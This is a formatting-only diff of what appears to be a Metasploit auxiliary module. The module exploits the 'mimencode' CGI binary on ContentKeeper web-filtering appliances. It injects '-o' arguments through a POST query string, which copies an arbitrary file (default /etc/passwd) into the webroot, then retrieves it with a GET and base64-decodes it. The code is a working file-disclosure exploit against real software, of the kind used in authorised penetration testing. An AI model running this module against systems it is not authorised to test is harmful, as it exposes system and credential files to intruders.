@@ -9,25 +9,25 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'ContentKeeper Web Appliance mimencode File Access',
+      'Name' => 'ContentKeeper Web Appliance mimencode File Access',
       'Description' => %q{
         This module abuses the 'mimencode' binary present within
         ContentKeeper Web filtering appliances to retrieve arbitrary
         files outside of the webroot.
         },
-      'References'   =>
-        [
-          [ 'OSVDB', '54551' ],
-          [ 'URL', 'http://www.aushack.com/200904-contentkeeper.txt' ],
-        ],
-      'Author'      => [ 'aushack' ],
-      'License'     => MSF_LICENSE)
+      'References' => [
+        [ 'OSVDB', '54551' ],
+        [ 'URL', 'http://www.aushack.com/200904-contentkeeper.txt' ],
+      ],
+      'Author' => [ 'aushack' ],
+      'License' => MSF_LICENSE)
 
     register_options(
       [
         OptString.new('FILE', [ true, 'The file to traverse for', '/etc/passwd']),
         OptString.new('URL', [ true, 'The path to mimencode', '/cgi-bin/ck/mimencode']),
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -37,9 +37,10 @@ class MetasploitModule < Msf::Auxiliary
       print_status("Attempting to connect to #{rhost}:#{rport}")
       res = send_request_raw(
         {
-          'method'  => 'POST',
-          'uri'     => normalize_uri(datastore['URL']) + '?-o+' + '/home/httpd/html/' + tmpfile + '+' + datastore['FILE'],
-        }, 25)
+          'method' => 'POST',
+          'uri' => normalize_uri(datastore['URL']) + '?-o+' + '/home/httpd/html/' + tmpfile + '+' + datastore['FILE'],
+        }, 25
+      )
 
       if (res and res.code == 500)
 
@@ -47,9 +48,10 @@ class MetasploitModule < Msf::Auxiliary
 
         file = send_request_raw(
           {
-            'method'  => 'GET',
-            'uri'     => '/' + tmpfile,
-          }, 25)
+            'method' => 'GET',
+            'uri' => '/' + tmpfile,
+          }, 25
+        )
 
         if (file and file.code == 200)
           print_status("Request for #{datastore['FILE']} appears to have worked on #{rhost}:#{rport}! Response: #{file.code}\r\n#{Rex::Text.decode_base64(file.body)}")
@@ -59,10 +61,8 @@ class MetasploitModule < Msf::Auxiliary
       elsif (res and res.code)
         print_error("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport} Response: \r\n#{res.body}")
       end
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
-
     end
   end
 end
